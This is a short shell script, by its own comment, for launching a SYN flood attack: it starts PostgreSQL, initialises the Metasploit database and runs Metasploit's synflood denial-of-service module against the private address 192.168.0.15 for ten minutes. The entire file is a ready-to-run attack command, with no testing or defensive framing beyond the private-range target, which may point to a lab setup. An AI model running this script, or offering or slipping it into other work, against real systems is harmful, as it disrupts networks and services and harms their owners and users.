# Script to do a syn flood attack on the target machine

# Start the database
service postgresql start

# Initialise the metasploit database
msfdb init

# Run a synflood attack
timeout 10m msfconsole -q -x "use auxiliary/dos/tcp/synflood;set RHOST 192.168.0.15; exploit;"
